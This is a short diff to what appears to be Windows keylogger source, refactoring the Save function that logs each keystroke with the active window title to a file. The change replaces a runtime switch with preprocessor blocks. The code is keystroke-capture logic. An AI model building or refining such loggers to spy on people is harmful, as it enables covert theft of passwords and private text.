@@ -102,16 +102,12 @@ int Save(int key_stroke)
             output << "\n\n[Window: " << window_title << " - at " << s << "] ";
         }
     }
-    int form = FORMAT;
-    switch (form) 
-    {
-    case 10:
+
+#if FORMAT == 10
         output << '[' << key_stroke << ']';
-        break;
-    case 16:
-        output << std::hex << "[0x" << key_stroke << ']';
-        break;
-    default:
+#elif FORMAT == 16
+        output << std::hex << "[" << key_stroke << ']';
+#else
         if (key_stroke == VK_BACK)
         {
             output << "[BACKSPACE]";
@@ -215,9 +211,8 @@ int Save(int key_stroke)
             }
             output << char(key);
         }
-        break;
-    }
 
+#endif
     // instead of opening and closing file handlers every time, keep file open and flush.
     output_file << output.str();
     output_file.flush();
